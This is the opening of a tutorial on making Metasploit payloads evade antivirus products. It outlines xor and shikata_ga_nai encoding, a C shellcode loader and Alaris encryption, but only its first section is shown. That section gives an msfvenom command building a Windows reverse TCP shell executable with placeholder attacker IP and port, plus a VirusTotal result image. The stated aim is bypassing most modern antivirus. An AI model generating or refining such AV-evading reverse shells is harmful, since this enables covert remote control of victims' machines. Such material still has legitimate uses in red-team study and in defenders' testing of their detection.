### Making MSF payload almost invisible and bypassing most AVs

## Contents
- Introduction 

- Ways to obfuscate msf payloads
    - Basic msf payload
    - Using xor and shikata_ga_nai
    - Using shellcode with C shellcode loader
    - Using encryption (Alaris)
    
## Introduction 

Avs have significantly improved in recent years it still relies on age-old AV techniques that are often trivial to bypass. In this post we’ll analyse some basic pool of techniques which can be used to protect a basic msf payload to bypass most modern Avs. 

## Ways to hide msf payloads
In the following we will explore ways to encode/obfuscate msf payload and will have a goal to finally reach a point where we are satisfied with our results.

### Basic msf payload
Lets see how our basic msf payload stand againt Virustotal.

- Build command
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip here> LPORT=<port here> -f exe -o shivang_shell.ex
```

- Result

![Alt Text](https://i.ibb.co/rQrdx2j/basic-msf.png)
